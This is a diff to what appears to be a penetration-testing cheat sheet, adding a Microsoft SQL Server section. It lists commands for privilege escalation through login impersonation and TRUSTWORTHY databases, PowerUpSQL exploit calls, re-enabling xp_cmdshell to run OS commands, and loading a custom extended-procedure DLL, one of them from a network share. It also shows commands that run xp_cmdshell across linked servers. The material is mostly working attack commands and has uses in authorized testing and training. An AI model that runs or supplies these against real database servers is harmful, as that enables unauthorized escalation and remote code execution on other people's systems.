@@ -287,7 +287,9 @@ Find-PSRemotingLocalAdminAccess
 
 ```
 
+
 #### Microsoft SQL Server - MSSQL
+
 ##### MSSQL Enumeration
 ```powershell filename="PowerUpSQL"
 # Find all local SQL instances
@@ -336,7 +338,7 @@ Get-SQLServerPasswordHash -Verbose -Instance SQLServer1\Instance1 -Migrate
 
 
 ##### SQL Database Enumeration
-```SQL filename="SQL"
+```sql filename="SQL"
 # Version
 SELECT @@version
 
@@ -377,6 +379,68 @@ SELECT * FROM sys.user_token
 
 # Active login token
 SELECT * FROM sys.login_token
+```
+
+##### SQL Database PrivEsc
+```sql
+# User Impersonation - PrivEsc Public to sysadmin
+# Find SQL Server logins which can be impersonated in the current database
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+
+# Powerupsql find impersonation privEsc
+Invoke-SQLAuditPrivImpersonateLogin -Instance  instname -Exploit -Verbose
+
+## TrustWorthy - privEsc public to service Account
+SELECT name as database_name , SUSER_NAME( owner_sid ) AS database_owner, is_trustworthy_on AS TRUSTWORTHY From sys.databases
+
+# Find trustworthy database using powerupsql
+Invoke-SQLAuditPrivTrustworthy -Instance ops-sqlsrvone -Verbose
+
+# Command Execution
+# If xp_cmdshell is uninstalled
+sp_addextendedproc  'xp_cmdshell' , 'xplog70.dll'
+ 
+# If xp_cmdshell is disabled
+EXEC sp_configure 'show advanced options',1
+RECONFIGURE
+EXEC  sp_configure 'xp_cmdshell',1
+RECONFIGURE
+
+EXEC master.. xp_cmdshell whoami
+
+# Extended stored procedures
+# Adding an Extended Stored Procedure
+# sp_addextendedproc can be used to register the stored procedure. 
+# Note that the function name in the DLL and the command must exactly be the same (case sensitive)
+
+sp_addextendedproc  'xp_calc ' , 'C:\mydll\xp_calc.dll'
+# Execute the stored procedure
+EXEC  xp_calc
+
+# Drop the stored procedure
+sp_dropextendedproc  xp_calc
+
+
+## Extended stored procedures using powerupsql
+Create SQLFileXpDll -OutFile  C:\temp\xp_calc.dll  -Command  "calc.exe"  -ExportName xp_calc
+Get-SQLQuery   -Instance ins -Query  " sp_addextendedproc 'xp_calc ', '[\\192.168.x.x\fileserver\xp_calc.dll](file://192.168.x.x/fileserver/xp_calc.dll)'  "
+Get-SQLQuery  -Instance ins    -Query "EXEC xp_calc"
+
+```
+
+##### SQL Server Links
+```powershell
+# Enumerate sqlserver links
+Get-SQLServerLink -Instance <MSSQLinstance>
+
+#Server links crawling using powerUPsql
+Get-SQLServerLinkCrawl -Instance <mssqlinstance> -verbose
+
+#Executing commands using powerUpSQL
+Get-SQLServerLinkCrawl -Instance <mssqlinstance> -Query "exec master..xp_cmdshell 'whoami'"
+
+Get-SQLServerLinkCrawl -instance  <mssqlinstance>   | where Instance -ne "Broken Link" |foreach-object { Get-SQLQuery -instance  <mssqlinstance>   -Query (get-SQLServerLinkQuery -Path $_.Path -Sql 'select name from master..sysdatabases') }
+
 ```
 #### Microsoft Exchange and Outlook Web App
 ```
